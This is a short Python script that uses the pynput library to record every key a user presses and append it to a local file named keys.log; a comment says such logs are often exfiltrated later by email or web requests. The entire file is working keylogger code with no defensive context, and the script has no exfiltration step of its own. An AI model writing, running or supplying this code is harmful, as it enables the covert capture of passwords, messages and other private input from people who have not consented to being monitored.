#Logs user keystrokes — often exfiltrated later via email or web requests.
from pynput import keyboard

def on_press(key):
    with open("keys.log", "a") as f:
        try:
            f.write(f"{key.char}\n")
        except:
            f.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
